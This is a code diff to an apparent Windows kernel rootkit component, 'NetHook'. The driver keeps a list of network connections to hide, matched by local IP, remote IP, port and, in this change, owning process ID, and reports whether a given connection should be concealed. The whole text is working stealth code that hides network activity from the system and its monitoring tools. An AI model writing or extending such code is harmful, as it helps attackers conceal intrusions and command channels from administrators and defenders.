@@ -25,11 +25,12 @@ NTSTATUS NetHook::InitNetworkHook()
 	return status;
 }
 
-VOID NetHook::NetAddHiddenConnection(PNETHOOK_HIDDEN_CONNECTION NewConnection)
+VOID NetHook::NetAddHiddenConnection(_In_ const PNETHOOK_HIDDEN_CONNECTION NewConnection)
 {
 	if ((NewConnection->IpAddress == 0) && 
 		(NewConnection->RemoteIpAddress == 0) && 
 		(NewConnection->Port == 0) && 
+		(NewConnection->ConnectPID == 0) &&
 		(NewConnection->_Unknown == 0))
 	{
 		KdPrint(("Empty Connection!"));
@@ -45,6 +46,7 @@ VOID NetHook::NetAddHiddenConnection(PNETHOOK_HIDDEN_CONNECTION NewConnection)
 			if (((NewConnection->IpAddress) && (CurrentEntry->Connection->IpAddress == NewConnection->IpAddress)) ||
 				((NewConnection->Port) && (CurrentEntry->Connection->Port == NewConnection->Port)) ||
 				((NewConnection->RemoteIpAddress) && (CurrentEntry->Connection->RemoteIpAddress == NewConnection->RemoteIpAddress)) ||
+				((NewConnection->ConnectPID) && (CurrentEntry->Connection->ConnectPID == NewConnection->ConnectPID)) ||
 				((NewConnection->_Unknown) && (CurrentEntry->Connection->_Unknown == NewConnection->_Unknown)))
 			{
 				KdPrint(("Connection Already Exists"));
@@ -72,6 +74,7 @@ VOID NetHook::NetAddHiddenConnection(PNETHOOK_HIDDEN_CONNECTION NewConnection)
 	NewEntry->Connection->IpAddress = NewConnection->IpAddress;
 	NewEntry->Connection->Port = NewConnection->Port;
 	NewEntry->Connection->RemoteIpAddress = NewConnection->RemoteIpAddress;
+	NewEntry->Connection->ConnectPID = NewConnection->ConnectPID;
 	NewEntry->Connection->_Unknown = NewConnection->_Unknown;
 
 	if (!g_NetworkLinkedListHead)
@@ -101,10 +104,18 @@ VOID NetHook::NetAddHiddenConnection(PNETHOOK_HIDDEN_CONNECTION NewConnection)
 	{
 		KdPrint(("Remote Address %d Added Successfully!", NewEntry->Connection->RemoteIpAddress));
 	}
+
+	if (NewEntry->Connection->ConnectPID)
+	{
+		KdPrint(("PID %d Added Successfully!", NewEntry->Connection->ConnectPID));
+	}
 }
 
 
-BOOLEAN NetHook::NetIsHiddenIpAddress(ULONG IpAddress, USHORT PortNumber, ULONG RemoteIpAddress)
+BOOLEAN NetHook::NetIsHiddenIpAddress(_In_ const ULONG IpAddress,
+	_In_ const USHORT PortNumber,
+	_In_ const ULONG RemoteIpAddress,
+	_In_ const ULONG ConnectPID)
 {
 	PNET_CONNECTION_ENTRY CurrentEntry = g_NetworkLinkedListHead;
 	union
@@ -124,7 +135,8 @@ BOOLEAN NetHook::NetIsHiddenIpAddress(ULONG IpAddress, USHORT PortNumber, ULONG 
 	{
 		if ((IpAddress && (CurrentEntry->Connection->IpAddress == IpAddress)) ||
 			(Port.port && (CurrentEntry->Connection->Port == Port.port)) ||
-			(RemoteIpAddress && (CurrentEntry->Connection->RemoteIpAddress == RemoteIpAddress)))
+			(RemoteIpAddress && (CurrentEntry->Connection->RemoteIpAddress == RemoteIpAddress)) ||
+			(ConnectPID && (CurrentEntry->Connection->ConnectPID == ConnectPID)))
 		{
 			return TRUE;
 		}
